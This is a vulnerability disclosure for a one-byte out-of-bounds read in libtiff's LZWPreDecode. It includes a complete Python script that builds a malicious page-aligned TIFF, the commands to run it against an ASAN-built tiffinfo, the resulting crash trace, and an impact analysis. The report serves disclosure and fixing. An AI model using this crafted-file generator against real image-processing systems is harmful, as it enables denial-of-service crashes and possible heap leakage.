## Bug0: LZWPreDecode out-of-bounds read of rawdata[1] when StripByteCount equals one

`LZWPreDecode()` in `tif_lzw.c` at line 268 reads `tif->tif_rawdata[1]` without first verifying that `tif_rawcc` is at least 2, which allows a crafted TIFF file whose single-byte LZW strip is positioned at the last byte of the mmap region to cause an out-of-bounds read one byte past the end of the mapped file page.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffinfo binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

PAGE_SIZE = 4096

def make_tiff():
    header_size = 8
    num_tags    = 9
    ifd_size    = 2 + num_tags * 12 + 4   # 114 bytes
    ifd_end     = header_size + ifd_size   # 122

    # Strip byte must sit at the very last byte of a page-aligned file
    strip_data_offset = PAGE_SIZE - 1      # 4095
    file_size         = PAGE_SIZE          # 4096
    pad_size          = strip_data_offset - ifd_end  # 3973

    header  = b'II'
    header += struct.pack('<H', 42)
    header += struct.pack('<I', header_size)   # IFD at offset 8

    entries = []
    entries.append(struct.pack('<HHII', 256, 4, 1, 1))                   # ImageWidth=1
    entries.append(struct.pack('<HHII', 257, 4, 1, 1))                   # ImageLength=1
    entries.append(struct.pack('<HHII', 258, 3, 1, 8))                   # BitsPerSample=8
    entries.append(struct.pack('<HHII', 259, 3, 1, 5))                   # Compression=5 (LZW)
    entries.append(struct.pack('<HHII', 262, 3, 1, 1))                   # PhotometricInterpretation=1
    entries.append(struct.pack('<HHII', 273, 4, 1, strip_data_offset))   # StripOffsets=4095
    entries.append(struct.pack('<HHII', 277, 3, 1, 1))                   # SamplesPerPixel=1
    entries.append(struct.pack('<HHII', 278, 4, 1, 1))                   # RowsPerStrip=1
    entries.append(struct.pack('<HHII', 279, 4, 1, 1))                   # StripByteCounts=1

    ifd  = struct.pack('<H', num_tags)
    for e in entries:
        ifd += e
    ifd += struct.pack('<I', 0)   # next IFD = 0

    padding    = b'\x00' * pad_size
    strip_data = b'\x00'   # rawdata[0]==0x00 triggers the rawdata[1] access

    tiff_data = header + ifd + padding + strip_data

    assert len(tiff_data) == file_size
    assert len(tiff_data) % PAGE_SIZE == 0
    assert tiff_data[strip_data_offset] == 0x00

    return tiff_data

if __name__ == '__main__':
    data = make_tiff()
    with open('poc_input.tif', 'wb') as f:
        f.write(data)
    print('[+] poc_input.tif written (4096 bytes; strip byte at offset 4095)')
    print('    rawdata[0] = 0x00 (last byte of mmap page)')
    print('    rawdata[1] = first byte of unmapped page => OOB Read')
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/tiffinfo -D -d poc_input.tif || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==2851317==ERROR: AddressSanitizer: unknown-crash on address 0x7fc554e3f000 at pc 0x7fc5589c46de bp 0x7fff680a7e70 sp 0x7fff680a7e60
READ of size 1 at 0x7fc554e3f000 thread T0
    #0 0x7fc5589c46dd in LZWPreDecode (libtiff.so.3+0x36c6dd)
    #1 0x7fc558a47062 in TIFFStartStrip (libtiff.so.3+0x3ef062)

### Impact

An attacker who can supply a crafted TIFF file can trigger a one-byte out-of-bounds read past the end of the mmap region in `LZWPreDecode()`, causing a wild-pointer dereference that immediately crashes the calling process and produces a denial-of-service condition. On non-mmap code paths the same missing bounds check allows `LZWPreDecode()` to read an uninitialized or stale heap byte and use its value to select the legacy `LZWDecodeCompat` decoder, potentially leaking heap state as a side-channel or producing incorrect decode output in downstream processing. The attack requires only that the target application calls `TIFFReadEncodedStrip` or an equivalent decoded-read API on the malicious file; no authentication or privileges are required beyond the ability to supply an input file.
